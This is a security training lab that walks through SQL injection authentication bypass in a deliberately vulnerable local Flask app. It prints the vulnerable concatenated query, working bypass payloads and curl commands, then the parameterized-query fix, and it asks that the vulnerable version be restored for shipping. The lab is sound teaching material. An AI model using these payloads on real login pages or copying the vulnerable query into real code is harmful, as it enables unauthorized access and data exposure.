# Lab 2 — SQL Injection (Authentication Bypass)

## Overview

SQL Injection occurs when user input is directly concatenated into SQL queries without sanitization or parameterization. An attacker can manipulate the query logic by injecting SQL syntax into input fields.

Authentication bypass is one of the most critical SQL injection impacts — it allows an attacker to log in as any user (typically admin) without knowing the password. This works by injecting conditions that make the `WHERE` clause always evaluate to true.

## Step 1 — Analyze the Code

Open `app/app.py` and look at the `/login` route (lines ~53-75):

```python
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        conn = get_db()
        # VULNERABLE: String concatenation in SQL query
        query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
        try:
            user = conn.execute(query).fetchone()
        except Exception:
            conn.close()
            return render_template('login.html', error='Invalid credentials')
```

**Why this is vulnerable:** The `username` and `password` values are inserted directly into the SQL string using f-string interpolation. There is no escaping, no parameterization, and no input validation.

When a user enters `admin` as username and `' OR 1=1 --` as password, the resulting query becomes:

```sql
SELECT * FROM users WHERE username='admin' AND password='' OR 1=1 --'
```

Breaking this down:
- `password=''` — checks for empty password (false)
- `OR 1=1` — always true, overrides the previous condition
- `--` — SQL comment, ignores the trailing `'`

The query returns all users, and `.fetchone()` returns the first row (which is admin, since it was inserted first).

## Step 2 — Exploit the Vulnerability

### Prerequisites
- Start the lab: `docker compose up --build`
- App is at: `http://localhost:5002`

### Step 2.1 — Normal login (verify app works)

1. Go to `http://localhost:5002`
2. Login with `employee` / `password123`
3. You should see the dashboard with "Welcome, employee!" and the employee badge

### Step 2.2 — SQL Injection via browser

1. Go to `http://localhost:5002/login`
2. Enter:
   - **Username:** `admin`
   - **Password:** `' OR 1=1 --`
3. Click "Sign In"

You should be logged in as `admin` and see the admin dashboard with the employee directory (salary data).

[Screenshot: Admin dashboard showing "Welcome, admin!" with employee salary table]

### Step 2.3 — SQL Injection via curl

```bash
curl -X POST http://localhost:5002/login \
  -d "username=admin&password=' OR 1=1 --" \
  -c cookies.txt \
  -L
```

Then access the dashboard:

```bash
curl -b cookies.txt http://localhost:5002/dashboard
```

The response will contain "Welcome, admin!" and the employee directory data.

### Alternative payloads

These also work:

```
Username: ' OR 1=1 --
Password: anything
```

```
Username: admin'--
Password: anything
```

```
Username: admin
Password: ' OR '1'='1
```

## Step 3 — Discuss & Implement the Fix

### The Problem
User input is concatenated directly into the SQL query string, allowing SQL syntax injection.

### The Fix
Use **parameterized queries** (also called prepared statements) with `?` placeholders.

**Before** (`app/app.py`, line ~61):
```python
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
user = conn.execute(query).fetchone()
```

**After:**
```python
query = "SELECT * FROM users WHERE username=? AND password=?"
user = conn.execute(query, (username, password)).fetchone()
```

### Why This Works
With parameterized queries, the database driver treats the `?` values strictly as **data**, not as SQL syntax. Even if the user enters `' OR 1=1 --`, it is treated as a literal string to match against the password column — not as SQL code to execute.

The resulting query effectively becomes:
```sql
SELECT * FROM users WHERE username='admin' AND password=''' OR 1=1 --'
```
The entire input is safely escaped and treated as the password value. No rows match, so login fails.

**Additional best practices:**
- Never store passwords in plaintext — use bcrypt or argon2 for hashing
- Use an ORM (SQLAlchemy, etc.) which parameterizes by default
- Apply input validation as defense-in-depth

## Step 4 — Verify the Fix

1. Apply the fix in `app/app.py`: replace the f-string query with a parameterized query
2. Restart: `docker compose down && docker compose up --build`
3. Attempt the same injection:
   - Username: `admin`
   - Password: `' OR 1=1 --`
4. Result: "Invalid credentials" error message — the injection no longer works

5. Verify normal login still works:
   - Username: `employee`, Password: `password123` → Dashboard shows "Welcome, employee!"
   - Username: `admin`, Password: `supersecretpassword` → Dashboard shows "Welcome, admin!"

[Screenshot: Login page showing "Invalid credentials" after SQL injection attempt]

**Remember to revert the fix** so the lab ships in its vulnerable state.
